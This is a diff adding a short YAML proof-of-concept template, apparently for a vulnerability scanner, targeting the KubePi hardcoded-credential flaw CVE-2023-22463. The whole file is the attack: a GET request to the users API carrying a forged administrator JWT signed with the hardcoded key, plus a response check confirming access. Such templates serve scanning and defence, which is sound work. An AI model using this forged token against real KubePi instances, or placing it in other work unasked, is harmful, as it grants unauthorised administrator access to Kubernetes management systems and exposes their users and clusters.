@@ -1,0 +1,18 @@
+id: poc-yaml-KubePi-hardcoding
+info:
+  name: KubePi 硬编码漏洞(CVE-2023-22463)
+  severity: high
+  tags:
+  - 硬编码凭据
+  - 两高一弱
+  - CVE-2023-22463
+  finger: KubePi
+requests:
+- method: GET
+  path: /kubepi/api/v1/users
+  headers:
+    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8
+  expression: status_code == 200 && contains(body,"apiVersion") && contains(body,"nickName")
+    && contains(body,"type")
+variables: {}
+transport: http
